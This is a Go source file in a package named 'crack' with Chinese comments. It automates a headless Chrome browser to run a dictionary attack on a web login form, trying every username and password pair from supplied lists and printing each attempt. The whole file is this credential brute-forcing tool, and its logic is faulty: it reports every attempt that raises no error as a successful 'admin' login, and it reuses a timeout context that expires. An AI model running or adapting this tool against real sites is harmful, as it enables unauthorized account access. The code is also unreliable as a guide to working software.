package crack

import (
	"context"
	"fmt"
	"time"

	"github.com/chromedp/chromedp"
)

type Steps struct {
	Xpath string // 输入框的xpath路径
	Dict  []string
}

// step 0 输入用户名 step 1 输入密码 step 2 登录按钮
func CheckLogin(url string, steps [3]Steps) {
	var result string
	ctx, cancel := chromedp.NewContext(context.Background())
	defer cancel()

	for _, user := range steps[0].Dict {
		for _, pass := range steps[1].Dict {
			ctx, cancel = context.WithTimeout(ctx, time.Second*10) // 设置上下文超时
			defer cancel()
			var res string
			var actions []chromedp.Action
			actions = append(actions, chromedp.Navigate(url))
			actions = append(actions, chromedp.SendKeys(steps[0].Xpath, user))
			actions = append(actions, chromedp.SendKeys(steps[1].Xpath, pass))
			actions = append(actions, chromedp.Click(steps[2].Xpath))
			actions = append(actions, chromedp.Location(&res))
			err := chromedp.Run(ctx, actions...)
			if err != nil {
				result = fmt.Sprintf("[-] %s  %v", url, err)
				fmt.Println(result)
				break
			}
			result = fmt.Sprintf("%s admin:%s login", url, pass)
			fmt.Println(result)
		}
	}
}
